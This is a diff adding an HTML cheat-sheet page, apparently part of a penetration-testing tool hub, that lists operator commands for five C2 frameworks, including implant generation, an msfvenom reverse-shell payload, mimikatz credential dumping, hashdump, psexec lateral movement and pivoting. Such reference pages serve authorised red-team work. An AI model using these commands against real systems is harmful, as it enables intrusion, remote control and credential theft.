@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<link rel="icon" type="image/svg+xml" href="../assets/images/dragon-logo.svg">
+<link rel="icon" type="image/png" href="../assets/images/dragon-favicon.png">
+<title>C2 Frameworks – Hacking Tools</title>
+<link rel="stylesheet" type="text/css" href="../assets/css/style.css">
+
+</head>
+
+<body class="theme-standard" data-page-key="tools-c2">
+<div class="wallpaper"></div>
+
+<div class="tool-section-nav"><a href="../index.html?page=dashboard" target="_top">&larr; Back to Dashboard</a></div>
+
+<h1 class="category-title">C2 Frameworks</h1>
+
+<div class="grid">
+  <div class="modal" style="margin: 0 auto 3rem; max-width: 1000px; cursor: default;">
+    <table>
+      <tr><th>Tool</th><th>Description</th></tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-cobalt')">
+        <td>Cobalt Strike</td><td>Commercial C2 used in real engagements</td>
+      </tr>
+      <tr id="cmd-cobalt" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common (licensed) -----</div>
+    <div>[Start team server] — ./teamserver &lt;IP&gt; password</div>
+    <div>[Connect client] — Cobalt Strike client &gt; Connect &gt; &lt;IP&gt;:50050</div>
+
+    <div class="comment-line">---- Listeners & Payloads -----</div>
+    <div>[Add listener] — Cobalt Strike &gt; Listeners &gt; Add (HTTP/HTTPS beacon)</div>
+    <div>[Generate stager] — Attacks &gt; Packages &gt; Windows Executable (S)</div>
+    <div>[Scripted web delivery] — Attacks &gt; Web Drive-by &gt; Scripted Web Delivery</div>
+
+    <div class="comment-line">---- Post-exploitation -----</div>
+    <div>[Spawn beacon] — beacon&gt; spawn &lt;listener&gt;</div>
+    <div>[Pass the hash] — beacon&gt; jump psexec64 &lt;IP&gt; &lt;listener&gt;</div>
+    <div>[Mimikatz] — beacon&gt; mimikatz sekurlsa::logonpasswords</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-sliver')">
+        <td>Sliver</td><td>Modern open-source C2 framework</td>
+      </tr>
+      <tr id="cmd-sliver" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Start server] — sliver-server</div>
+    <div>[Generate implant] — generate --http &lt;IP&gt; --save /tmp/implant</div>
+    <div>[Start HTTP(S) listener] — http --lport 443</div>
+
+    <div class="comment-line">---- Sessions -----</div>
+    <div>[List sessions] — sessions</div>
+    <div>[Interact] — use &lt;SESSION_ID&gt;</div>
+    <div>[Shell] — shell</div>
+
+    <div class="comment-line">---- Post-exploitation -----</div>
+    <div>[Process list] — ps</div>
+    <div>[Port forward] — portfwd add --remote &lt;IP&gt;:3389 --bind 127.0.0.1:3389</div>
+    <div>[Install extension (BOF)] — armory install &lt;extension&gt;</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-mythic')">
+        <td>Mythic</td><td>Modular C2 with multiple agents</td>
+      </tr>
+      <tr id="cmd-mythic" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Start server] — sudo ./mythic-cli start</div>
+    <div>[Check status] — sudo ./mythic-cli status</div>
+    <div>[Install agent] — sudo ./mythic-cli install github &lt;agent-repo-url&gt;</div>
+
+    <div class="comment-line">---- Payloads -----</div>
+    <div>[Build payload] — Web UI &gt; Payloads &gt; New Payload</div>
+    <div>[Configure C2 profile] — Web UI &gt; C2 Profiles &gt; http</div>
+
+    <div class="comment-line">---- Ops -----</div>
+    <div>[View callbacks] — Web UI &gt; Active Callbacks</div>
+    <div>[Task agent] — Web UI &gt; Callback console &gt; shell whoami</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-covenant')">
+        <td>Covenant</td><td>.NET-based C2 for Windows environments</td>
+      </tr>
+      <tr id="cmd-covenant" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Start Covenant] — dotnet Covenant.dll</div>
+    <div>[Create HTTP listener] — Web UI &gt; Listeners &gt; Create HTTP Listener</div>
+
+    <div class="comment-line">---- Launchers -----</div>
+    <div>[Generate launcher] — Web UI &gt; Launchers &gt; Binary / PowerShell / MSBuild</div>
+    <div>[Host launcher] — Web UI &gt; Launchers &gt; Host</div>
+
+    <div class="comment-line">---- Grunts (agents) -----</div>
+    <div>[List grunts] — Web UI &gt; Grunts</div>
+    <div>[Interact] — Web UI &gt; Grunts &gt; Interact &gt; shell whoami</div>
+    <div>[Elevate] — Web UI &gt; Grunts &gt; Tasks &gt; Elevate</div>
+
+  </td>
+</tr>
+
+      <tr class="tool-row" onclick="toggleCmd('cmd-metasploit')">
+        <td>Metasploit</td><td>Exploit framework with Meterpreter sessions</td>
+      </tr>
+      <tr id="cmd-metasploit" class="command-row">
+  <td colspan="2" class="command-cell">
+
+    <div class="comment-line">---- Common -----</div>
+    <div>[Launch console] — msfconsole</div>
+    <div>[Multi-handler] — use exploit/multi/handler</div>
+    <div>[Search module] — search type:exploit &lt;keyword&gt;</div>
+
+    <div class="comment-line">---- Payloads -----</div>
+    <div>[Generate payload] — msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=4444 -f exe -o payload.exe</div>
+    <div>[Set options] — set LHOST &lt;IP&gt;; set LPORT 4444; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div>
+    <div>[Run (background)] — exploit -j</div>
+
+    <div class="comment-line">---- Meterpreter -----</div>
+    <div>[System info] — sysinfo</div>
+    <div>[Migrate process] — migrate &lt;PID&gt;</div>
+    <div>[Dump hashes] — hashdump</div>
+    <div>[Pivot / route] — run autoroute -s 10.0.0.0/24</div>
+
+  </td>
+</tr>
+    </table>
+  </div>
+</div>
+
+<script>
+  const embedded = window.self !== window.top;
+
+  // Tell the hub's modal our real content height. Called synchronously on
+  // the one interaction that changes it (toggling a command row) so there's
+  // no dependency on observer/timer scheduling; ResizeObserver below is
+  // just a fallback for anything else (initial layout, font swaps, etc).
+  function reportHeight() {
+    if (embedded) {
+      window.parent.postMessage({ type: "tool-frame-height", height: document.body.scrollHeight }, "*");
+    }
+  }
+
+  function toggleCmd(id) {
+    const row = document.getElementById(id);
+    row.style.display = (row.style.display === "table-row") ? "none" : "table-row";
+    reportHeight();
+  }
+
+  (function() {
+    const savedTheme = localStorage.getItem("/settings.html") || "standard";
+    document.body.classList.add("theme-" + savedTheme);
+    if (embedded) document.body.classList.add("embedded");
+  })();
+
+  if (embedded) {
+    new ResizeObserver(reportHeight).observe(document.body);
+    window.addEventListener("load", reportHeight);
+  }
+</script>
+
+<script src="../config/tools/c2.js"></script>
+<script src="../assets/script/wallpaper-loader.js"></script>
+<script src="../assets/script/theme-accent.js"></script>
+<script src="../assets/script/copy-commands.js"></script>
+<script src="../assets/script/page-effects.js"></script>
+<script src="../assets/script/page-effects-loader.js"></script>
+<script>
+  applyWallpaper(toolsC2Config.background, "tools-c2");
+</script>
+
+</body>
+</html>
